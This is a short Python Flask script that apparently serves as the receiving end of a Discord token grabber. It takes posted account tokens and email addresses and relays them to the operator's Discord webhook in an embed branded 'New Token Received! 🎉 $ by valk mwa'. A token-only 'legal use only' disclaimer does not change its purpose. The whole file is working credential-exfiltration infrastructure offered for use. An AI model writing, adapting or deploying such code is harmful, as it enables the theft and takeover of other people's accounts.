from dhooks import Webhook, Embed
from flask import Flask, request, jsonify
import datetime

app = Flask(__name__)
hook = Webhook("")  # Replace with your actual webhook URL

@app.route('/', methods=['POST'])
def index():
    # Get the JSON data from the request body
    data = request.get_json()
    token = data.get('token')
    email = data.get('email')
    
    if not token or not email:
        return jsonify({"error": "Missing token or email"}), 400  # Return error if either is missing
    
    # Create the embed to send to the Discord webhook
    embed = Embed(
        title="New Token Received! 🎉 $ by valk mwa",
        description="Here's the token and email received.",
        color=0x00ff00
    )
    embed.add_field(name="📜 Token", value=token, inline=False)
    embed.add_field(name="📧 Email", value=email, inline=False)
    embed.add_field(name="🕒 Time", value="`Token received at: `" + str(datetime.datetime.now()), inline=False)
    embed.add_field(name="🔒 Legal Disclaimer", value="`This is for legal use only.`", inline=False)

    # Send the embed to the webhook
    hook.send(embed=embed)

    return jsonify({"message": "Data received successfully"}), 200

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=81)
